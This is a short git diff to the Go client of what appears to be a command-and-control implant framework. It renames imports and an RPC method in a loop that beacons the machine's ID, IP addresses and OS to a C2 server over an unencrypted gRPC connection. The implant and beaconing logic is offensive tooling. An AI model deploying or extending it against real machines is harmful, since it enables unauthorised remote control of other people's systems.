@@ -3,8 +3,8 @@ package main
 import (
 	"context"
 	"github.com/denisbrodbeck/machineid"
-	"github.dev/nireitdev/go-C2-Prana/common"
-	"github.dev/nireitdev/go-C2-Prana/proto"
+	"github.dev/nireitdev/go-C2-Prana/internal/common"
+	proto2 "github.dev/nireitdev/go-C2-Prana/internal/proto"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
 	"log"
@@ -24,7 +24,7 @@ func main() {
 	}
 	defer conn.Close()
 
-	srv := proto.NewServerClient(conn)
+	srv := proto2.NewServerClient(conn)
 
 	//Who I am?
 	id, err := machineid.ID()
@@ -35,11 +35,11 @@ func main() {
 	os := runtime.GOOS
 
 	for {
-		srv.ImplantAlive(context.Background(), &proto.AliveMsg{ImplantID: id, IpAddr: ips, OS: os})
+		srv.ImplantAlive(context.Background(), &proto2.AliveMsg{ImplantID: id, IpAddr: ips, OS: os})
 
 		//test msg:
-		req := proto.ImplantRequest{Request: "Implanted!"}
-		resp, err := srv.ImplantCmd(context.Background(), &req)
+		req := proto2.ImplantRequest{Request: "Implanted!"}
+		resp, err := srv.ImplantTask(context.Background(), &req)
 		if err != nil {
 			log.Fatalf("Fallo intercambio de msgs: %v \n", err)
 		}
